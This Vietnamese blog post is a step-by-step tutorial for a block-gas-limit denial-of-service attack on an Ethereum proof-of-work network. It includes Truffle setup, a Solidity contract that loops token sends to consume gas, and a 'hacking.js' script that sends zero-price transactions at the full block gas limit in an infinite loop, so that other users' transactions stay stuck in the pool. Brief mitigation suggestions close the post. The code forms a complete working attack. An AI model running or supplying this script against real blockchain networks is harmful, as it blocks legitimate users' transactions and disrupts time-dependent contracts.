---
title: Block gas limit attack
date: 2021-07-27 10:20:30 +/-0700
categories: [Blockchain, Security]
tags: [blockchain, security, learning, practice, ethereum]     # TAG names should always be lowercase
---

# Blockchain Attack: Block gas limit attack
Blog này hướng dẫn chi tiết sử dụng kĩ thuật DoS with Block gas limit (đã nhắc tới trong bài [smart contract best practice 3](https://bui-duc-huy.github.io/posts/smart-contract-best-practice-3/#dos-with-block-gas-limit)) để tấn công 1 mạng  blockchain.

## Preparation
Trước khi bắt đầu tấn công mạng, ta cần tìm hiểu về blockchain network. Tìm hiểu về endpoint blockchain, luật đồng thuận, block struct của mạng và nhiều thứ khác.

Trước tiên về network: nắm rõ luật đồng thuận của mạng (ở bài post này sẽ tấn công mạng ethereum sử dụng luật đồng thuận `Proof of Work`)

Về **Block Struct**, bài post sử dụng cách thức tấn công `block gas limit` nên trước tiên sẽ tìm hiểu về thông số block gas limit của mạng.

Tìm hiểu về cách thức block được tạo ra và cách các transaction được đưa vào trong block.

Trên sẽ là các kiến thức nền tảng của blockchain cần biết trước khi bắt đầu vào thức hiện cuộc tấn công này.

Trước tiên ta cần set up folder cho toàn bộ script để thực hiện việc tấn công
```sh
mkdir block_gas_limit_attack
cd block_gas_limit_attack
```

## Get Block Gas Limit
Với cuộc tấn công block gas limit, trước tiên ta sẽ tìm thông số block gas limit của mạng (sử dụng `javascript` và thư viện `web3`)

```sh
npm install web3
vim getGasLimit.js
```
Thực hiện kết nối web3 với network:
```javascript
const Web3 = require("web3")
const web3Provider = new Web3.providers.HttpProvider("network endpoint")
const web3 = new Web3(web3Provider)

console.log(web3)
```

Lấy ra lastest block của mạng để kiểm tra tình trạng kết nối cũng như xem các thông số của block:
```javascript
async function getLastestBlock() {
    const block = await web3.eth.getBlock("latest")
    console.log(block)
}

getLastestBlock()
```

Nhận được kết quả trả về:
```sh
{
    number: 2074747,
    hash: '0xa587aa3b79e249fa13a799b700287a9a13f0aaeb90b5bdb59f019511a91a5843',
    mixHash: '0x63746963616c2062797a616e74696e65206661756c7420746f6c6572616e6365',
    parentHash: '0xb043c80558a303a6a6cff54ee12cb4c0c18d7d6c6d9875ca357ef792afee4aab',
    nonce: '0x0000000000000000',
    sha3Uncles: '0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347',
    logsBloom: '0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000',
    transactionsRoot: '0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421',
    stateRoot: '0xba29682e080d946de3d793b6d146cb3f9001f1ce6e4b088b7f2eb9e94707bc5e',
    receiptsRoot: '0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421',
    miner: '0x20f41061b59cdD1de39862dac8420Cde5B1C4611',
    difficulty: '1',
    totalDifficulty: '2074748',
    extraData: '0xf90148a00000000000000000000000000000000000000000000000000000000000000000f854941e3415214147f480c4a82130fa2fc75f870799499420f41061b59cdd1de39862dac8420cde5b1c4611942de1ec20190935f197f83dfcb5c49b424d1f78e594adb2d82c0247ee35774840e95313b6330e199605808400000000f8c9b8419f92d5c3c7ded5ab0b91e29829e7473a36ec4b9fa99929feb4b48891571f2a8f104383eddac4c1d14a6c73c070af96dbedeb4d2843c900cc0c79677750e4879800b8415d8987fd2229dc77fdc84e559055e59e38293ffaac01f72015979ed27707fa4b2e6bcdf55b381cbb214d8730b7afa7fc22cf768e10428c1b251e815809d22ff900b841591a9516ccc936a1f45e787e5b99e608d83249c64eb18ff2a22a9c59f1a27b0c633ea0ead2660f1c7e7c7bf76edf821029e121719096eae1740981eb4e2f9c9601',
    size: 845,
    gasLimit: 1890884448,
    gasUsed: 0,
    timestamp: 1627361583,
    uncles: [],
    transactions: []
}
```

Đã thấy thông số `gasLimit` của block là `1890884448`

Để thực hiện Block Gas Limit Attack, như đã được nhắc tới trong bài Smart Contract Best Practice, chúng ta thức hiện việc gửi transaction tới network với lượng gas sử dụng xấp xỉ gas limit của block để chặn các transaction khác được thực thi - đây gọi là DoS with Block gas limit. 

## Set up Truffle
Thực hiện việc gửi transaction với mức gas cao xấp xỉgas limit của block cách dễ nhất là sử dụng 1 custom smart contract thực hiện vòng lặp gửi token tới nhiều address trong 1 lời gọi hàm

Bắt đầu việc viết và test smart contract với `truffle`
```sh
truffle unbox metacoin
```

Connect truffle đến blockchain network
```javascript
// truffle-config.js
const PrivateKeyProvider = require("@truffle/hdwallet-provider");
const privateKey = "private key";
const privateKeyProvider = new PrivateKeyProvider(privateKey, "RPC-URL");

module.exports = {
    networks: {
        development: {
            provider: privateKeyProvider,
            host: "node_host",
            port: "node_port",
            network_id: "chain_id",
        },
    };
}
```
Thử việc deploy smart contract mẫu đến network
```sh
truffle migrate
```

## Write Smart Contract
Viết 1 smart contract thực hiện chuyển token cho nhiều địa chỉ khác nhau, và sẽ sử dụng hết `1890884448` gas của 1 block trong 1 transaction
 
 Tạo smart contract để thực hiện việc tấn công
```sh
cd contracts/
vim Transfer.sol
```

Code 1 contract đơn giản thực hiện việc chuyển token 
```solidity
pragma solidity >=0.4.25 <0.7.0;

contract Transfer {
    address payable private owner;
        
    constructor() public {
        owner = msg.sender;
    }

    function transfer(uint number) public {
        for (uint x; x < number; x++) {
            owner.send(1);
        }
    }
}
```

Deploy contract lên network
```javascript
// migrations/1_initial_migration.js
const Transfer = artifacts.require("Transfer");

module.exports = function(deployer) {
    deployer.deploy(Transfer)
};
```

```sh
truffle deploy
```

Chuyển 1 lượng token vừa đủ tới smart contract để thực hiện hacking
## Start Hacking 
Viết script thực hiện gọi hàm transfer của smart contract
```sh
vim hacking.js
```

```javascript
const network_endpoint = "network-endpoint"
const address = "address"
const privateKey = "privateKey"
const networkId = "4444"
const gasLimit = 1890884448

const Web3 = require("web3")
const web3Provider = new Web3.providers.HttpProvider(network_endpoint)
const web3 = new Web3(web3Provider)
const Transfer = require("./build/contracts/Transfer.json")

const contract = new web3.eth.Contract(Transfer.abi, Transfer.networks[networkId].address)

async function hack() {
    web3.eth.accounts.wallet.add(privateKey)
    const tx = contract.methods.transfer(1000000)
    const data = tx.encodeABI();
    let nonce = await web3.eth.getTransactionCount(address);
    while(true) {
        const signedTx = await web3.eth.accounts.signTransaction(
            {
                to: contract.options.address, 
                data,
                gas: gasLimit,
                gasPrice: 0,
                nonce, 
                chainId: networkId
            },
            privateKey
        );

        nonce++;
        web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    }
}
hack()
```

Sau khi gọi hàm thì có thể hàm thực thi đã fail trên blockchain network nhưng đã làm cho block bị sử dụng toàn bộ `gas` khiến các transaction khác đên trong thời điểm này sẽ nằm trong pool mãi mãi cho đến khi các miner thực hiện mở rộng `blockSize`

## Conclusion

DDoS, là từ chối dịch vụ, chiếm hữu tài nguyên, kẻ tấn công sẽ thực hiện các request để chiếm hữu tài nguyên, lỗi này xảy ra sẽ làm cho hệ thống của mình bị nghẽn, không thể phục vụ user bình thường, blockchain cũng có lỗi này, khi lỗi này xảy ra sẽ làm tắc nghẽn khả năng xử lý của một node trong mạng.

Lỗi `blockGasLimit` sẽ làm giảm hiệu năng và khả năng xử lý của 1 node trong mạng blockchain, mặc dù các miner có thể điều chỉnh `gasLimit` của một block để có thể khác phục lỗi này, nhưng điểu này có thể làm gia tăng phí gas và bùng nổ dữ liệu, nên các miner sẽ rất cân nhắc việc tăng `blockSize`.

Lỗi này cũng gây chậm trễ transaction của các user, điều này thực sự nguy hiểm đối với các smart contract yêu cầu logic về thời gian, vì trong thời gian hacker thực hiện ddos blockchain network, user không thể thực hiện các logic liên quan tới thời gian của mình.

## Solution

Mặc dù với các bản cập nhập của Ethereum, các lỗi này đã cơ bản được khắc phục bẳng cách các miner sẽ tự động tăng `blockSize` lên, nhưng vẫn làm cho các transaction của user bị delay 1 khoảng thời gian trước khi được thực sự xử lý

Sau đây sẽ là 1 số đề xuất khắc phục lỗi này:
1. Xây dựng middleware để kiểm soát lượng gas trong 1 transaction được gửi tới node
2. Chỉ cho phép gửi transaction với 1 số lượng nhất định
3. Xây dựng các mô hình tránh spam khác
